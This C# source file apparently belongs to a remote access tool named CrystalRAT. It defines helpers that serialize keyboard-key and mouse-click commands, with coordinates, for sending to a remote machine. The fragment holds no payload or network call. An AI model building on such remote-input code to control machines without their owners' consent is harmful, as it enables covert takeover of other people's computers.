using CrystalRATShared.Commands;
using CrystalRATShared.Serialization;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Input;

namespace CrystalClearRAT.Functions
{
    public static class ControlInput
    {


        public static byte[] KeyInfo(int key)
        {
            return CommandDataSerializer.Serialize(CommandFlags.KeyboardKey, (writer) =>
            {
                writer.Write(key);
            });
        }

        public static byte[] ClickInfo(int x, int maxX, int y, int maxY)
        {
            // MousePoint info = GetCursorPosition();

            return CommandDataSerializer.Serialize(CommandFlags.Click, (writer) =>
            {
                writer.Write(x);
                writer.Write(maxX);
                writer.Write(y);
                writer.Write(maxY);
            });
        }



    }
}